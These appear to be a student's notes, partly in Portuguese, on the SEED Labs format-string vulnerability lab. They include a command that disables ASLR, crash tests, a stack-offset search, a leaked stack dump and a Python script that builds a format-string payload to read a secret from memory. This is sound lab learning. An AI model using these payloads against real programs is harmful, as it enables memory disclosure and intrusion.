<!--
Notes:
format strings parecido com buffer overflow
menos tecnico que buffer overflow

ctf relativamente simples
-->
# Seed labs guide (Format-String vulnerability Lab)

<!--from the guide:
Some programs allow users to provide the entire or part of the
contents in a format string. If such contents are not sanitized, malicious users can use this opportunity to get
the program to run arbitrary code. A problem like this is called format string vulnerability.
--
$ sudo sysctl -w kernel.randomize_va_space=0
>
<!--
argumentos na stack
f {
printf("%d", n);
}
stack:
stack frame de f
%d
n

printf("%d %d", n)
vai ler cenas arbitrárias da stack
%d %d %d ... ler qqer cena da stack

printf("%d", n)
string "%d"
n
address to the string (in the stack)

e.g.
f(4, 5)
stack:
5
4  <- f points to here


printf("%d")

stack:
string (e.g "%d")
&string


printf("ABCD%d")

stack:
ABCD%d      %x  -> dá o ABCD (primeiros 4 bytes da string e depois vai imprimir os propios valores de %d)
&string     %x


"0xABCD%d" (ABCD como bytes)
ao imprimir %d vai aparacer igual (ABCD)

Quantos percentagens precisas de ter para chegar à tua string
ataque:
%x%x...%s
-->
<!--
compiling the program with make -> we can see some compilation warnings related to format strings
-->

<!--
crashed with python3 -c 'print("%d" * 1500) > file.txt
cat file.txt | nc ..
also crashed with "%d%d%d%d (*1500)" (com aspas)
and printed the stack
-->

<!--
target 0x11223344

secret message 0x080b4008

-->



<!--
python3 -c 'print("ABCD " + "%.8x " * 64)' > badfile
para chegar ao 44434241 (ABCD em little-endian) precisamos de 64 %x
-->
<!--
@
1122334410008049db580e532080e61c0ffffd800ffffd72880e62d480e5000ffffd7c88049f7effffd8000648049f4780e53205dc5dcffffd800ffffd80080e9720000000000000000000000000018de4c0080e500080e5000ffffdde88049effffffd8005dc5dc80e5320000ffffdeb40005dcA secret message

-->
```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080b4008
content[0:4] = (number).to_bytes(4,byteorder='little')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%x" * 63 + "%s"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[4:4 + len(fmt)] = fmt

# This line shows how to store a 4-byte string at offset 4
# content[4:8]  =  ("abcd").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

